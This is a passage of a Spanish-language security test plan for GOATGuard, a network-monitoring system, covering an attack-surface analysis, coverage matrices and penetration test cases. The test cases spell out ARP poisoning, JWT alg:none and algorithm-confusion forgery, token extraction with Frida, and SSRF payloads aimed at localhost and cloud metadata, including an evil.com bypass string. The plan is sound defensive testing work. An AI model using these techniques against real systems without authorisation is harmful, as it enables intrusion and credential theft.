# Documento de Casos de Prueba - GOATGuard

## Sistema de Monitoreo de Infraestructura y Gestion de Seguridad (Movil)

| Metadato | Valor |
|---|---|
| **Proyecto** | GOATGuard - Proyecto Integrador III |
| **Version del documento** | 2.0 |
| **Fecha** | 2026-03-01 |
| **Clasificacion** | Confidencial |
| **Metodologia de pruebas** | OWASP Testing Guide v4.2 + NIST SP 800-115 |
| **Alcance** | Agentes de captura, Backend centralizado, API REST, App movil Flutter |

---

## Tabla de Contenidos

1. [Estrategia de Pruebas](#1-estrategia-de-pruebas)
2. [Analisis de Superficie de Ataque](#2-analisis-de-superficie-de-ataque)
3. [Matriz de Cobertura OWASP Top 10](#3-matriz-de-cobertura-owasp-top-10)
4. [Matriz de Trazabilidad Riesgos-Pruebas](#4-matriz-de-trazabilidad-riesgos-pruebas)
5. [Matriz de Trazabilidad RF → Casos de Prueba](#5-matriz-de-trazabilidad-rf--casos-de-prueba)
6. [Casos de Prueba de Penetracion (PEN)](#6-casos-de-prueba-de-penetracion-pen)
7. [Casos de Prueba de Inyeccion y Dependencias (INJ)](#7-casos-de-prueba-de-inyeccion-y-dependencias-inj)
8. [Casos de Prueba de Estres de Red (NET)](#8-casos-de-prueba-de-estres-de-red-net)
9. [Casos de Prueba de Seguridad - Autenticacion y Autorizacion (SEC)](#9-casos-de-prueba-de-seguridad---autenticacion-y-autorizacion-sec)
10. [Casos de Prueba de Seguridad - Proteccion de Datos (DAT)](#10-casos-de-prueba-de-seguridad---proteccion-de-datos-dat)
11. [Casos de Prueba Funcionales - Modulo Agente (AGT)](#11-casos-de-prueba-funcionales---modulo-agente-agt)
12. [Casos de Prueba Funcionales - Modulo Backend/Motor (BKD)](#12-casos-de-prueba-funcionales---modulo-backendmotor-bkd)
13. [Casos de Prueba Funcionales - API REST (API)](#13-casos-de-prueba-funcionales---api-rest-api)
14. [Casos de Prueba Funcionales - App Movil (MOB)](#14-casos-de-prueba-funcionales---app-movil-mob)
15. [Casos de Prueba End-to-End (E2E)](#15-casos-de-prueba-end-to-end-e2e)
16. [Casos de Prueba de Regresion (REG)](#16-casos-de-prueba-de-regresion-reg)
17. [Casos de Prueba No Funcionales (NFR)](#17-casos-de-prueba-no-funcionales-nfr)
18. [Entorno de Pruebas](#18-entorno-de-pruebas)
19. [Roles y Responsabilidades](#19-roles-y-responsabilidades)
20. [Metricas de Pruebas](#20-metricas-de-pruebas)
21. [Gestion de Defectos](#21-gestion-de-defectos)
22. [Criterios de Entrada y Salida](#22-criterios-de-entrada-y-salida)
23. [Herramientas Requeridas](#23-herramientas-requeridas)
24. [Mapeo de Cumplimiento NIST SP 800-115 / ISO 27001](#24-mapeo-de-cumplimiento-nist-sp-800-115--iso-27001)
25. [Resumen Ejecutivo](#25-resumen-ejecutivo)

---

## 1. Estrategia de Pruebas

> Seccion alineada con IEEE 829 (Test Plan) e ISO 29119 (Software Testing)

### 1.1 Objetivo

Validar la seguridad, funcionalidad, rendimiento y fiabilidad del sistema GOATGuard mediante un enfoque de pruebas basado en riesgo, priorizando vectores de ataque criticos identificados en la arquitectura distribuida (agentes → colector → motor → API → app movil).

### 1.2 Alcance

| Componente | En Alcance | Fuera de Alcance |
|---|---|---|
| Agentes Python (scapy/pyshark) | Captura, sanitizacion, transmision TCP/UDP, ARP, heartbeat | Instalacion en produccion real |
| Colector Central | Recepcion, rotacion PCAP, concurrencia | Infraestructura de hosting |
| Motor de Analisis | Pipeline PCAP→metricas, deteccion anomalias, alertas | Algoritmos ML avanzados (fuera de MVP) |
| API REST (FastAPI) | 15 endpoints, autenticacion JWT, validacion | Integraciones con sistemas terceros |
| App Movil (Flutter) | Login, dashboard, dispositivos, alertas, push, offline | iOS (solo Android en MVP) |
| Base de Datos (PostgreSQL) | Integridad, transaccionalidad, proteccion de datos | Migracion de datos legacy |

### 1.3 Enfoque de Pruebas

| Nivel | Tipo | Tecnica | Prioridad |
|---|---|---|---|
| Seguridad | Penetracion (PEN) | Black-box + Grey-box, OWASP Testing Guide v4.2 | Critica |
| Seguridad | Inyeccion (INJ) | Fuzzing, payloads OWASP, analisis estatico | Critica |
| Seguridad | Auth/Authz (SEC) | Manipulacion JWT, fuerza bruta, enumeracion | Alta |
| Seguridad | Proteccion de datos (DAT) | Inspeccion de almacenamiento, cifrado, TLS | Alta |
| Rendimiento | Estres de red (NET) | Carga, flooding, saturacion, latencia | Alta |
| Funcional | Agente (AGT) | Caja negra, verificacion contra RFs | Alta |
| Funcional | Backend/Motor (BKD) | Caja negra + caja blanca, verificacion pipeline | Alta |
| Funcional | API REST (API) | Contrato (apigg.csv), validacion de esquema | Alta |
| Funcional | App Movil (MOB) | Exploratorio + scripted, compatibilidad | Alta |
| Integracion | End-to-End (E2E) | Pipeline completo agente→app | Alta |
| Mantenimiento | Regresion (REG) | Re-ejecucion post-fix | Media |
| No Funcional | Rendimiento/Disponibilidad (NFR) | Benchmarks, monitoreo continuo | Alta |

### 1.4 Criterios de Priorizacion (basados en riesgo)

1. **Critica**: Vectores que permiten acceso no autorizado a datos de red o ejecucion remota de codigo (PEN, INJ)
2. **Alta**: Fallas que comprometen la integridad del pipeline de datos o la disponibilidad del servicio (SEC, DAT, NET, funcionales core)
3. **Media**: Defectos de usabilidad, compatibilidad o rendimiento no critico (MOB UI, portabilidad)
4. **Baja**: Mejoras cosmeticas o documentacion

### 1.5 Supuestos y Restricciones

- Las pruebas de penetracion se ejecutan en entorno aislado con autorizacion escrita
- La red de pruebas (192.168.1.0/24) es dedicada y no afecta produccion
- Se dispone de dispositivos Android fisicos y emuladores para pruebas moviles
- El equipo tiene acceso a herramientas de seguridad licenciadas (Burp Suite Pro)
- Los agentes de prueba son instancias controladas, no en endpoints reales de usuarios

---

## 2. Analisis de Superficie de Ataque

Basado en el diagrama de arquitectura (architecturegg.png), el diagrama de clases (classdiagramgg.png) y el modelo ER (erdiagramgg.png), se identifican los siguientes vectores de ataque y puntos vulnerables:

### 1.1 Vectores Identificados en la Arquitectura

| ID | Vector | Componentes Afectados | Severidad | Justificacion |
|---|---|---|---|---|
| V-01 | Canal TCP Agente-Colector sin cifrado | PC1/PC2/PC3 Agents → Colector Central | **Critica** | El diagrama de arquitectura muestra conexiones TCP planas entre agentes y colector dentro de la red 192.168.1.0/24. Sin TLS, un atacante en la misma LAN puede interceptar todo el trafico PCAP mediante ARP spoofing. |
| V-02 | Canal UDP de metricas sin autenticacion | Agents → Colector (UDP) | **Alta** | RF-006 transmite metricas via UDP cada 5s. UDP es connectionless y no ofrece autenticacion inherente: cualquier nodo puede inyectar paquetes UDP falsificados con metricas manipuladas. |
| V-03 | API Gateway como punto unico de fallo | API Gateway → DB SQL | **Alta** | El diagrama muestra un unico API Gateway que realiza QUERY a la BD. Es el punto de entrada para toda la app movil y concentra autenticacion, consultas y escrituras. |
| V-04 | Almacenamiento PCAP en disco local | Storage/Transmision (PCAP Files) | **Media** | Los archivos PCAP contienen trafico de red en crudo. Si el servidor se compromete, se expone todo el historial de comunicaciones de la red. |
| V-05 | Flujo JSON App Movil-API sin certificate pinning | App Movil ↔ API Gateway | **Alta** | La comunicacion JSON entre app y API es susceptible a MitM si no implementa certificate pinning (riesgo RS02). |
| V-06 | Base de datos SQL centralizada | DB SQL (PostgreSQL) | **Alta** | El modelo ER muestra que `password_hash` en tabla USER y `jwt_token` en SESSION son campos criticos. Inyeccion SQL o acceso directo expone todo el sistema. |
| V-07 | ARP scanning desde agentes | Agents → Red LAN | **Media** | RF-008 ejecuta escaneos ARP periodicos. Un agente comprometido puede ejecutar ARP spoofing/poisoning contra toda la subred. |
| V-08 | Token FCM en tabla PUSH_TOKEN | PushToken (token VARCHAR(255)) | **Media** | El token FCM almacenado permite enviar notificaciones push. Si se extrae, un atacante puede enviar alertas falsas al administrador. |

### 1.2 Puntos Criticos del Diagrama de Clases

| Clase | Atributo/Metodo Vulnerable | Riesgo |
|---|---|---|
| `User` | `password_hash: String` | Si el algoritmo de hashing es debil (MD5/SHA1), las credenciales son recuperables por fuerza bruta. |
| `User` | `authenticate(password): boolean` | Timing attack: diferencias en tiempo de respuesta revelan si el usuario existe. |
| `Session` | `jwt_token: TEXT` | Almacenamiento del token completo en BD permite robo de sesion si la BD se compromete. |
| `Device` | `ip: VARCHAR(45)`, `mac: VARCHAR(17)` | Sin validacion estricta, inyeccion de valores malformados puede causar errores en el motor de analisis. |
| `Alert` | `description: TEXT` | Campo de texto libre; si se renderiza en la app sin sanitizar, permite XSS almacenado. |
| `Agent` | `register(hostname, mac): void` | Sin autenticacion mutua, un atacante puede registrar agentes falsos e inyectar datos. |
| `EndpointSnapshot` | Todos los campos NUMERIC | Valores fuera de rango (cpu_pct > 100, bandwidth negativo) pueden corromper calculos del motor. |

### 1.3 Puntos Criticos del Modelo ER

| Tabla | Vulnerabilidad | Impacto |
|---|---|---|
| `DEVICE.alias` | VARCHAR(64) sin sanitizacion | Stored XSS si el alias se renderiza sin escape en la app movil (RF-038). |
| `ALERT.anomaly_type` | VARCHAR(50) con valores controlados por el motor | Si el motor es manipulado, se pueden generar tipos de alerta arbitrarios. |
| `AGENT.uid` | VARCHAR(100) como identificador | Si el UID es predecible (hostname+MAC), un atacante puede suplantar agentes. |
| `SESSION.expires_at` | TIMESTAMP sin validacion de zona horaria | Desincronizacion de relojes puede causar sesiones que nunca expiran o que expiran prematuramente. |
| `NETWORK_SNAPSHOT` | Campos NUMERIC nullable | Valores NULL no controlados pueden causar NullPointerException en el motor de analisis. |

---

## 3. Matriz de Cobertura OWASP Top 10 (2021)

| # | Categoria OWASP | Casos de Prueba | Estado |
|---|---|---|---|
| A01 | Broken Access Control | PEN-007, PEN-008, SEC-003, SEC-009 | Cubierto |
| A02 | Cryptographic Failures | PEN-001, DAT-003, DAT-006, DAT-007, SEC-002 | Cubierto |
| A03 | Injection | INJ-001, INJ-002, INJ-003, INJ-004, INJ-005, INJ-006 | Cubierto |
| A04 | Insecure Design | PEN-002, PEN-005, SEC-008, E2E-001 | Cubierto |
| A05 | Security Misconfiguration | PEN-009, SEC-004, SEC-006, SEC-007 | Cubierto |
| A06 | Vulnerable/Outdated Components | INJ-007, INJ-008, NFR-007 | Cubierto |
| A07 | Identification & Auth Failures | SEC-001, SEC-003, PEN-006, SEC-009 | Cubierto |
| A08 | Software & Data Integrity Failures | DAT-005, INJ-007, INJ-008, SEC-008 | Cubierto |
| A09 | Security Logging & Monitoring Failures | SEC-005 | Cubierto |
| A10 | Server-Side Request Forgery (SSRF) | PEN-011 | Cubierto |

---

## 4. Matriz de Trazabilidad Riesgos-Pruebas

| Riesgo (CSV) | Casos de Prueba Asociados | Cobertura |
|---|---|---|
| RS01 - Exposicion de mapa de red | PEN-001, PEN-002, DAT-001, DAT-002, MOB-006 | Almacenamiento local, biometria, borrado remoto |
| RS02 - Intercepcion MitM | PEN-003, PEN-004, PEN-005, DAT-003 | Certificate pinning, TLS, cifrado payload |
| RS03 - Uso malintencionado | SEC-005, DAT-005, API-012 | Audit logs, roles, aviso legal |
| RT01 - Restricciones OS movil | MOB-007, MOB-008 | Foreground services, permisos bateria |
| RT02 - Falsos positivos fingerprinting | BKD-005, AGT-006 | OUI DB, confirmacion cruzada |
| RT03 - Saturacion de red (Flooding) | NET-001, NET-002, NET-003 | Rate limiting, intervalos configurables, kill switch |
| RT05 - Latencia movil-backend | NET-006, NFR-001, NFR-002 | Payload optimization, indicador conexion |
| RO04 - Descoordinacion movil-backend | API-001 a API-015 | Validacion de contratos OpenAPI |
| RC01 - UI incomprensible | MOB-009 | Pruebas de usabilidad |
| RC02 - Fatiga notificaciones | MOB-010, BKD-008 | Agrupacion, niveles severidad |
| RC03 - Rendimiento gama baja | NFR-006, MOB-011 | Paginacion, emuladores limitados |

---

## 5. Matriz de Trazabilidad RF → Casos de Prueba

| RF | Descripcion | Casos de Prueba | Cobertura |
|---|---|---|---|
| RF-001 | Captura continua en interfaz | AGT-001 | Completa |
| RF-002 | Slicing dinamico con orig_len | AGT-002, AGT-009 | Completa |
| RF-003 | Transmision TCP persistente | AGT-003, PEN-001, DAT-005, NET-001 | Completa |
| RF-004 | Lectura CPU | AGT-004 | Completa |
| RF-005 | Lectura RAM | AGT-004 | Completa |
| RF-006 | Envio metricas UDP c/5s | AGT-004, PEN-005, NET-002 | Completa |
| RF-007 | Link speed por interfaz | AGT-004, AGT-010 | Completa |
| RF-008 | Escaneo ARP periodico | AGT-006 | Completa |
| RF-009 | Autoregistro con handshake | AGT-007, PEN-002, INJ-004 | Completa |
| RF-010 | Heartbeat periodico | AGT-007, NET-003 | Completa |
| RF-011 | Recepcion TCP simultanea | BKD-001, PEN-001 | Completa |
| RF-012 | Recepcion metricas UDP | BKD-001, PEN-005, NET-002 | Completa |
| RF-013 | Buffer PCAP con escritura concurrente | BKD-001, NET-001 | Completa |
| RF-014 | Rotacion por tiempo/tamano | BKD-002 | Completa |
| RF-015 | Registro y desregistro de agentes | AGT-007, PEN-002 | Completa |
| RF-016 | Invocacion de herramientas de analisis | BKD-003, INJ-006 | Completa |
| RF-017 | Parsing de outputs | BKD-003 | Completa |
| RF-018 | Condensacion y persistencia | BKD-003 | Completa |
| RF-019 | Limpieza de PCAP procesados | BKD-007 | Completa |
| RF-020 | Ancho de banda con orig_len | BKD-009 | Completa |
| RF-021 | Top talkers | BKD-010 | Completa |
| RF-022 | ISP health (ping 8.8.8.8) | BKD-011 | Completa |
| RF-023 | Packet loss global (umbral 1%) | BKD-012 | Completa |
| RF-024 | Retransmisiones TCP por endpoint | BKD-013 | Completa |
| RF-025 | Conexiones fallidas por endpoint | BKD-014 | Completa |
| RF-026 | DNS response time (umbral 100ms) | BKD-015 | Completa |
| RF-027 | Jitter | BKD-016 | Completa |
| RF-028 | Inventario dinamico de activos | BKD-005 | Completa |
| RF-029 | Deteccion de patrones sospechosos | BKD-006 | Completa |
| RF-030 | Login con JWT | API-001, INJ-001, SEC-001, PEN-006 | Completa |
| RF-031 | Proteccion JWT en endpoints | API-002, SEC-003, PEN-007 | Completa |
| RF-032 | Listar dispositivos | API-003, INJ-002 | Completa |
| RF-033 | Detalle de dispositivo | API-004, PEN-008 | Completa |
| RF-034 | Metricas globales de red | API-008, API-010 | Completa |
| RF-035 | Metricas por dispositivo | API-006 | Completa |
| RF-036 | Listar alertas con filtros | API-012 | Completa |
| RF-037 | Listar agentes | API-011 | Completa |
| RF-038 | Editar alias | API-005, INJ-003, PEN-008 | Completa |
| RF-039 | Notificaciones push | BKD-008, API-014, MOB-006 | Completa |
| RF-040 | Consulta historica con resolucion | API-007, API-009, INJ-005 | Completa |
| RF-041 | Pantalla de login | MOB-001, DAT-001 | Completa |
| RF-042 | Persistencia de sesion | MOB-002, DAT-001 | Completa |
| RF-043 | Cierre de sesion | MOB-002, API-002, DAT-002 | Completa |
| RF-044 | Dashboard de red | MOB-003 | Completa |
| RF-045 | Listado de dispositivos | MOB-004 | Completa |
| RF-046 | Detalle de dispositivo | MOB-004 | Completa |
| RF-047 | Edicion de alias en app | MOB-005, INJ-003 | Completa |
| RF-048 | Segmento de red | MOB-009 | Completa |
| RF-049 | Listado de alertas | MOB-006 | Completa |
| RF-050 | Marcar alerta como vista | API-013, MOB-006 | Completa |
| RF-051 | Estado de agentes | MOB-008 | Completa |
| RF-052 | Graficas historicas | MOB-007 | Completa |
| RF-053 | Notificaciones push en app | MOB-006 | Completa |
| RF-054 | Registro de token push | API-014, API-015, PEN-010 | Completa |

---

## 6. Casos de Prueba de Penetracion (PEN)

> **Prioridad: CRITICA** | Basados en vectores V-01 a V-08 y riesgos RS01, RS02, RS03

### PEN-001: Intercepcion de trafico PCAP en canal Agente-Colector

| Campo | Detalle |
|---|---|
| **ID** | PEN-001 |
| **Titulo** | Intercepcion de flujo TCP entre agente y colector mediante ARP Spoofing |
| **Prioridad** | Critica |
| **RF Asociados** | RF-003, RF-011 |
| **Riesgo Asociado** | RS02, V-01 |
| **Objetivo** | Verificar si un atacante en la misma LAN puede capturar el trafico PCAP transmitido entre agentes y colector |
| **Precondiciones** | - Al menos 1 agente activo transmitiendo a colector. - Maquina atacante en la misma subred 192.168.1.0/24. - Herramientas: Ettercap/arpspoof + Wireshark |
| **Pasos** | 1. Desde la maquina atacante, ejecutar ARP poisoning entre el agente (ej. 192.168.1.10) y el colector (ej. 192.168.1.1). 2. Activar Wireshark filtrando por el puerto TCP del colector. 3. Observar si los paquetes PCAP retransmitidos son legibles en texto plano. 4. Intentar reconstruir sesiones TCP capturadas con `tcpflow` o `tshark`. |
| **Resultado Esperado** | El trafico debe estar cifrado con TLS. Si se captura texto plano o datos PCAP legibles, el test **FALLA**. |
| **Criterio de Aceptacion** | Todos los flujos TCP entre agentes y colector deben usar TLS 1.2+ con cipher suites AES-256-GCM o ChaCha20-Poly1305. Los datos capturados por el atacante deben ser ilegibles. Certificados con caducidad <1 ano. Validacion de certificado en ambos extremos (mTLS recomendado). |
| **Severidad si falla** | Critica - Exposicion total del trafico de red monitorizado |

---

### PEN-002: Suplantacion de agente mediante inyeccion de handshake falso

| Campo | Detalle |
|---|---|
| **ID** | PEN-002 |
| **Titulo** | Registro de agente falso en el colector mediante handshake fabricado |
| **Prioridad** | Critica |
| **RF Asociados** | RF-009, RF-015 |
| **Riesgo Asociado** | RS03, V-02, V-07 |
| **Objetivo** | Determinar si un atacante puede registrar un agente falso y enviar datos manipulados al colector |
| **Precondiciones** | - Conocimiento del formato de handshake (hostname+MAC). - Maquina atacante en la subred. - Herramientas: Python con socket/scapy |
| **Pasos** | 1. Capturar o inferir el formato del paquete de handshake (RF-009). 2. Fabricar un paquete de registro con hostname falso y MAC inventada. 3. Enviar al puerto TCP del colector. 4. Verificar si el colector acepta y registra el agente falso. 5. Enviar datos PCAP fabricados y verificar si se procesan y persisten. |
| **Resultado Esperado** | El colector debe rechazar el handshake por falta de autenticacion mutua (certificado o token pre-compartido). El agente falso no debe quedar registrado. |
| **Criterio de Aceptacion** | Solo agentes con credenciales validas (token pre-compartido o certificado TLS cliente) pueden registrarse. Intentos no autorizados generan log de auditoria con IP, timestamp y payload truncado. Rate limiting de 3 intentos/minuto por IP de origen. |
| **Severidad si falla** | Critica - Permite inyeccion de datos falsos en todo el pipeline de analisis |

---

### PEN-003: Man-in-the-Middle en comunicacion App Movil - API

| Campo | Detalle |
|---|---|
| **ID** | PEN-003 |
| **Titulo** | Interceptacion de comunicacion API REST mediante proxy MitM |
| **Prioridad** | Critica |
| **RF Asociados** | RF-030, RF-031, RF-032 a RF-040 |
| **Riesgo Asociado** | RS02 |
| **Objetivo** | Verificar si la app movil implementa certificate pinning y rechaza certificados no confiables |
| **Precondiciones** | - App instalada en dispositivo/emulador. - Proxy MitM configurado (Burp Suite/mitmproxy). - Certificado CA del proxy instalado en el dispositivo |
| **Pasos** | 1. Configurar proxy Burp Suite como intermediario. 2. Instalar CA de Burp en el dispositivo Android. 3. Ejecutar la app e intentar login. 4. Observar si el trafico es interceptable y modificable. 5. Si hay pinning, verificar que la app rechaza la conexion y muestra error. |
| **Resultado Esperado** | La app debe rechazar la conexion TLS al detectar un certificado que no coincide con el pin configurado. No debe transmitir credenciales a traves del proxy. |
| **Criterio de Aceptacion** | Con certificate pinning activo, toda comunicacion interceptada falla con error SSL. Sin pinning, el test FALLA. |
| **Severidad si falla** | Critica - Token JWT y credenciales expuestos en texto plano |

---

### PEN-004: Robo de token JWT desde almacenamiento local del dispositivo

| Campo | Detalle |
|---|---|
| **ID** | PEN-004 |
| **Titulo** | Extraccion de JWT desde almacenamiento local de la app movil |
| **Prioridad** | Alta |
| **RF Asociados** | RF-041, RF-042 |
| **Riesgo Asociado** | RS01 |
| **Objetivo** | Verificar que el token JWT se almacena de forma segura (Android Keystore) y no en SharedPreferences o archivos de texto plano |
| **Precondiciones** | - Dispositivo rooteado o emulador con acceso root. - App con sesion activa. - Herramientas: adb, Frida, objection |
| **Pasos** | 1. Conectar al dispositivo via `adb shell`. 2. Navegar a `/data/data/<package_name>/shared_prefs/`. 3. Buscar tokens JWT en archivos XML. 4. Inspeccionar SQLite databases locales. 5. Usar Frida para hookear metodos de almacenamiento y extraer el token en runtime. 6. Si se extrae el token, intentar usarlo desde curl para acceder a la API. |
| **Resultado Esperado** | El token JWT debe estar almacenado en Android Keystore (cifrado por hardware). No debe ser legible desde archivos planos ni extraible via hooks triviales. |
| **Criterio de Aceptacion** | No se encuentra JWT en shared_prefs, bases de datos locales ni cache. El almacenamiento usa EncryptedSharedPreferences o Android Keystore. |
| **Severidad si falla** | Alta - Acceso completo al mapa de red y dispositivos |

---

### PEN-005: Inyeccion de metricas UDP falsificadas

| Campo | Detalle |
|---|---|
| **ID** | PEN-005 |
| **Titulo** | Envio de paquetes UDP con metricas falsificadas al colector |
| **Prioridad** | Alta |
| **RF Asociados** | RF-006, RF-012 |
| **Riesgo Asociado** | V-02 |
| **Objetivo** | Verificar si el colector valida la autenticidad de los paquetes UDP de metricas o acepta datos de cualquier origen |
| **Precondiciones** | - Puerto UDP del colector conocido. - Formato del paquete de metricas conocido o inferible. - Herramientas: Python socket, hping3 |
| **Pasos** | 1. Enviar paquete UDP al puerto de metricas del colector con UID de agente valido pero IP de origen distinta. 2. Enviar metricas con valores extremos (cpu_pct=999, ram_pct=-50). 3. Enviar paquetes con UID de agente inexistente. 4. Verificar en la BD si los datos falsificados fueron persistidos. 5. Verificar si se generaron alertas basadas en metricas inyectadas. |
| **Resultado Esperado** | El colector debe validar: (a) que el IP de origen coincide con el agente registrado, (b) que los valores estan dentro de rangos validos, (c) que el UID corresponde a un agente activo. Paquetes invalidos deben descartarse y loguearse. |
| **Criterio de Aceptacion** | 0% de paquetes falsificados persistidos en BD. Intentos generan entrada en log de auditoria. |
| **Severidad si falla** | Alta - Corrupcion del pipeline de analisis y generacion de alertas falsas |

---

### PEN-006: Escalamiento de privilegios via manipulacion de JWT

| Campo | Detalle |
|---|---|
| **ID** | PEN-006 |
| **Titulo** | Manipulacion de payload JWT para escalar privilegios o suplantar usuarios |
| **Prioridad** | Alta |
| **RF Asociados** | RF-030, RF-031 |
| **Riesgo Asociado** | RS03 |
| **Objetivo** | Verificar que el JWT no puede ser manipulado para cambiar el usuario o inyectar claims arbitrarios |
| **Precondiciones** | - Token JWT valido obtenido legitimamente. - Herramientas: jwt.io, jwt_tool, Python PyJWT |
| **Pasos** | 1. Decodificar el JWT y examinar claims (user_id, exp, iat). 2. Modificar el `user_id` en el payload y re-firmar con `alg: none`. 3. Intentar usar el token modificado contra la API. 4. Intentar cambiar `alg` de RS256 a HS256 (confusion de algoritmo). 5. Intentar re-firmar con clave simetrica derivada de la clave publica. 6. Verificar que tokens expirados son rechazados. |
| **Resultado Esperado** | La API debe rechazar: tokens con `alg: none`, tokens refirmados con algoritmo incorrecto, tokens con claims modificados. Debe responder 401 en todos los casos. |
| **Criterio de Aceptacion** | Ninguna manipulacion de JWT permite acceso no autorizado. El servidor valida algoritmo, firma e integridad de claims estrictamente. |
| **Severidad si falla** | Alta - Suplantacion completa de identidad |

---

### PEN-007: Enumeracion de dispositivos y red via API sin autorizacion

| Campo | Detalle |
|---|---|
| **ID** | PEN-007 |
| **Titulo** | Acceso a endpoints protegidos sin token o con token invalido |
| **Prioridad** | Alta |
| **RF Asociados** | RF-031, RF-032 a RF-040 |
| **Riesgo Asociado** | RS01 |
| **Objetivo** | Verificar que todos los endpoints excepto login rechazan peticiones sin autenticacion valida |
| **Precondiciones** | - URL base de la API. - Herramientas: curl, Postman, Burp Suite Intruder |
| **Pasos** | 1. Enviar GET a `/api/devices` sin header Authorization. 2. Enviar GET a `/api/network/metrics` con token expirado. 3. Enviar GET a `/api/alerts` con token malformado (string aleatorio). 4. Enviar GET a `/api/agents` con header Authorization vacio. 5. Iterar sobre los 15 endpoints documentados repitiendo los pasos 1-4. |
| **Resultado Esperado** | Todos los endpoints protegidos retornan 401 Unauthorized con mensaje generico que no revela informacion del sistema. |
| **Criterio de Aceptacion** | 100% de endpoints protegidos retornan 401 para cada variante de token invalido. El cuerpo del error no contiene stack traces, rutas internas ni versiones de software. |
| **Severidad si falla** | Alta - Fuga de informacion de la red monitoreada |

---

### PEN-008: Explotacion de IDOR en endpoints con parametro ID

| Campo | Detalle |
|---|---|
| **ID** | PEN-008 |
| **Titulo** | Insecure Direct Object Reference en endpoints de dispositivos y alertas |
| **Prioridad** | Alta |
| **RF Asociados** | RF-033, RF-035, RF-038, RF-050 |
| **Riesgo Asociado** | RS01 |
| **Objetivo** | Verificar si un usuario autenticado puede acceder a recursos de otra red manipulando IDs numericos secuenciales |
| **Precondiciones** | - Token JWT valido. - Al menos 2 redes configuradas (si el modelo soporta multi-network en futuro). - Herramientas: Burp Suite Intruder |
| **Pasos** | 1. Obtener el ID de un dispositivo propio via `GET /api/devices`. 2. Incrementar/decrementar el ID y enviar `GET /api/devices/{id_ajeno}`. 3. Intentar `PUT /api/devices/{id_ajeno}/alias` con alias arbitrario. 4. Enumerar IDs de alerta via `GET /api/alerts` y acceder a alertas de otros contextos. 5. Intentar `PATCH /api/alerts/{id_ajeno}/seen` para marcar alertas que no pertenecen al usuario. |
| **Resultado Esperado** | El sistema debe validar que el recurso solicitado pertenece a la red/usuario autenticado. Si el ID no corresponde, retorna 404 (no 403, para evitar enumeracion). |
| **Criterio de Aceptacion** | No se puede acceder, modificar ni enumerar recursos fuera del contexto de la red autenticada. |
| **Severidad si falla** | Alta - Acceso a informacion de redes ajenas |

---

### PEN-009: Escaneo de puertos y servicios expuestos en el servidor

| Campo | Detalle |
|---|---|
| **ID** | PEN-009 |
| **Titulo** | Reconocimiento de servicios expuestos en el servidor colector/backend |
| **Prioridad** | Media |
| **RF Asociados** | RF-011, RF-012 |
| **Riesgo Asociado** | V-03 |
| **Objetivo** | Identificar si el servidor expone puertos o servicios innecesarios que amplien la superficie de ataque |
| **Precondiciones** | - IP del servidor conocida. - Herramientas: Nmap |
| **Pasos** | 1. Ejecutar `nmap -sV -sC -p- <IP_servidor>` para escaneo completo de puertos. 2. Identificar servicios: puerto API, puerto TCP colector, puerto UDP metricas, puerto PostgreSQL. 3. Verificar si PostgreSQL (5432) esta expuesto externamente. 4. Verificar si hay servicios de debug (pdb, debugpy) activos. 5. Verificar versiones de servicios para CVEs conocidos. |
| **Resultado Esperado** | Solo deben estar expuestos: puerto API (HTTPS), puerto TCP colector (TLS), puerto UDP metricas. PostgreSQL no debe ser accesible externamente. No deben existir servicios de debug. |
| **Criterio de Aceptacion** | Maximo 3-4 puertos abiertos y justificados. PostgreSQL vinculado solo a localhost. Sin banners que revelen versiones de software. |
| **Severidad si falla** | Media - Ampliacion de superficie de ataque |

---

### PEN-010: Reverse engineering de la app movil Flutter

| Campo | Detalle |
|---|---|
| **ID** | PEN-010 |
| **Titulo** | Analisis estatico del APK para extraer secretos embebidos |
| **Prioridad** | Media |
| **RF Asociados** | RF-041, RF-054 |
| **Riesgo Asociado** | RS01 |
| **Objetivo** | Verificar que el APK no contiene secretos hardcodeados (API keys, URLs internas, claves de cifrado) |
| **Precondiciones** | - APK de la app. - Herramientas: apktool, jadx, MobSF, strings |
| **Pasos** | 1. Descompilar APK con `apktool d goatguard.apk`. 2. Buscar strings con `grep -ri "api_key\|secret\|password\|token\|http://" .`. 3. Abrir en jadx y buscar clases de configuracion. 4. Verificar si la URL de la API esta hardcodeada como HTTP (no HTTPS). 5. Buscar claves de Firebase/FCM embebidas. 6. Ejecutar MobSF para analisis automatizado. |
| **Resultado Esperado** | No se encuentran credenciales, API keys privadas ni secretos criticos en el APK. La URL del backend es configurable y usa HTTPS. Solo se permite la clave publica de FCM (google-services.json). |
| **Criterio de Aceptacion** | MobSF no reporta hallazgos de severidad critica o alta en secretos embebidos. Score de seguridad MobSF >= 70/100. `strings` no revela tokens, passwords ni URLs HTTP. Obfuscacion de Dart/Flutter aplicada. |
| **Severidad si falla** | Media - Extraccion de credenciales para acceso no autorizado |

---

### PEN-011: Server-Side Request Forgery (SSRF) en API

| Campo | Detalle |
|---|---|
| **ID** | PEN-011 |
| **Titulo** | Verificar que la API no permite SSRF para acceder a servicios internos |
| **Prioridad** | Alta |
| **RF Asociados** | RF-032 a RF-040 |
| **Riesgo Asociado** | OWASP A10, V-03 |
| **Objetivo** | Verificar que ningun parametro de la API permite al atacante forzar peticiones a servicios internos (PostgreSQL, colector, servicios cloud metadata) |
| **Precondiciones** | - Token JWT valido. - Herramientas: Burp Suite, curl |
| **Pasos** | 1. Identificar parametros que aceptan URLs o IPs en los endpoints. 2. Intentar `?url=http://localhost:5432` para acceder a PostgreSQL. 3. Intentar `?url=http://169.254.169.254/latest/meta-data/` (AWS metadata). 4. Intentar `?url=http://127.0.0.1:8000/docs` para acceder a docs internos de FastAPI. 5. Intentar `?callback=http://internal-service:8080/admin`. 6. Probar con bypass: `http://0x7f000001`, `http://[::1]`, `http://localhost%00@evil.com`. |
| **Resultado Esperado** | La API no realiza peticiones a URLs proporcionadas por el usuario. Si algun parametro requiere URL, se aplica whitelist estricta de dominios permitidos. |
| **Criterio de Aceptacion** | 0 peticiones exitosas a servicios internos o metadata cloud. Ningun endpoint permite redireccion arbitraria. |
| **Severidad si falla** | Alta - Acceso a servicios internos y posible exfiltracion de credenciales cloud |

---

### PEN-012: Escaneo automatizado de vulnerabilidades

| Campo | Detalle |
|---|---|
| **ID** | PEN-012 |
| **Titulo** | Escaneo automatizado de la superficie de ataque con herramientas DAST |
| **Prioridad** | Alta |
| **RF Asociados** | Transversal |
| **Riesgo Asociado** | Todos los vectores |
| **Objetivo** | Ejecutar escaneo automatizado para identificar vulnerabilidades no cubiertas por pruebas manuales |
| **Precondiciones** | - API desplegada en entorno de pruebas. - Herramientas: OWASP ZAP, Nuclei, Nikto |
